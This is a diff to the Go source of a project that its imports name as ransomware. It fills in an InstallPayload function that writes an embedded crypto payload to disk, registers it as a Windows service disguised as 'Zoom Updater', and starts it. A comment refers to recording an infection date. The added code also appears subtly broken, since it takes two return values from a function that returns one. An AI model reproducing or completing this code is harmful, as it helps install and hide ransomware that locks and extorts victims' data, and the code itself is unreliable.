@@ -14,6 +14,7 @@ import (
     "bufio"
     "time"
 
+    "github.com/sug0/sr-ransomware/go/win"
     "github.com/sug0/sr-ransomware/go/exe"
     "github.com/sug0/sr-ransomware/go/errors"
     "github.com/sug0/sr-ransomware/go/crypto/util"
@@ -21,8 +22,15 @@ import (
 )
 
 func InstallPayload() error {
-    // TODO: extract cryptoservice and install it as service
-    return nil
+    _, err := ioutil.WriteFile(cryptoPayload, cryptoserviceBytes, 0744)
+    if err != nil {
+        return errors.Wrap(pkg, "failed to install payload", err)
+    }
+    err = win.InstallService("zoomupdater", "Zoom Updater", cryptoPayload)
+    if err != nil {
+        return errors.Wrap(pkg, "failed to install payload service", err)
+    }
+    return errors.WrapIfNotNil(pkg, "failed to start payload service", win.StartService("zoomupdater"))
 }
 
 // Register infection date.
